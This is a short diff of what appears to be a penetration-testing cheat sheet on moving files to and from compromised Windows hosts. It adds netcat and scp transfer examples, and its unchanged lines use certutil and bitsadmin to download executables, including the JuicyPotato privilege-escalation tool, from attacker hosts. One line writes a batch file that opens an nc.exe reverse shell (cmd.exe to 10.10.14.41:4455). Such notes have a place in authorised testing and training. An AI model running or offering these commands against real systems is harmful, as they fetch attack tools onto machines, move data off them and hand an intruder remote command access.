@@ -18,13 +18,19 @@ certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
 
 bitsadmin /transfer myDownload /priority normal http://10.10.14.3:8000/JuicyPotato.exe jp.exe
 
-nc
+
+nc -nv TARGET_IP 1234 < received_file
+
+nc -nlvp 1234 > file_to_send
 
 curl
 
 wget
 
-scp
+scp example.txt user@192.168.1.100:/path/to/destination/
+
+scp user@192.168.1.100:/path/to/file.txt /path/on/local/machine/
+
 
 echo c:\Users\kohsuke\Desktop\nc.exe 10.10.14.41 4455 -e cmd.exe > reverse.bat
 ```
